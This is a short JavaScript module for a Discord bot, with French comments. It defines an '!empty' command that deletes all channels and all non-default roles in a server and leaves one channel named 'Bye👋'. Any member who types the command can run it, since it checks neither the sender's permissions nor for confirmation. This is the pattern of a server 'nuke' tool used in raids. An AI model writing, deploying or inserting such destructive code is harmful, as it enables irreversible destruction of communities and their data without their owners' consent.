module.exports = {
    name: "empty",
    description: "Vide un serveur en supprimant tous les canaux et rôles sauf un canal 'Bye :)'",
    execute: async (message, client) => {
        if (!message.guild) return;

        try {
            if (message.content.startsWith('!empty')) {
                const guild = message.guild;

                // Supprimer les canaux existants
                for (const channel of guild.channels.cache.values()) {
                    await channel.delete();
                }

                // Supprimer les rôles existants (sauf les rôles de base et le rôle @everyone)
                for (const role of guild.roles.cache.values()) {
                    if (role.id !== guild.id) {
                        await role.delete();
                    }
                }

                // Créer un nouveau canal "Bye :)"
                await guild.channels.create('Bye👋', { type: 'GUILD_TEXT' });

                // message.channel.send('Le serveur a été vidé. Un canal "Bye :)" a été créé.');
            }
        } catch (err) {
            console.log(err);
            message.channel.send('# erreur\nUne erreur est survenue lors de la suppression des canaux et des rôles.');
        }
    }
}
